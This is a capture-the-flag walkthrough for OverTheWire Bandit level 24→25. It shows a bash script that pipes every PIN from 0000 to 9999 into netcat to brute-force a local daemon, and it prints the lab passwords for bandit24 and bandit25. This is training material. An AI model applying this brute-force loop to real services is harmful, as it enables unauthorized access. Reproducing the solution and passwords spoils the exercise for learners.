# Bandit Level 24 → Level 25

### Level Goal
A daemon is listening on port **30002** and will give you the password for **bandit25** if you send the password for **bandit24** *followed by* a secret 4-digit numeric pincode.  
There is no way to retrieve the pincode except brute-forcing all **0000–9999** combinations.  
You **do not** need to create new connections each time.

---

### Solution

```bash
nc localhost 30002
ctrl + c

mkdir /tmp/folder
cd /tmp/folder
nano script.sh
```

Write this script:

```bash
#!/bin/bash

psswd="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

{
sleep 1
for i in $(seq -w 0000 9999); do
        key="$psswd $i"
        echo "$key"
done
} | nc localhost 30002
```

Then run:

```bash
chmod 777 script.sh
./script.sh   # the password for bandit25 will appear here
exit
ssh bandit25@bandit.labs.overthewire.org -p 2220
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
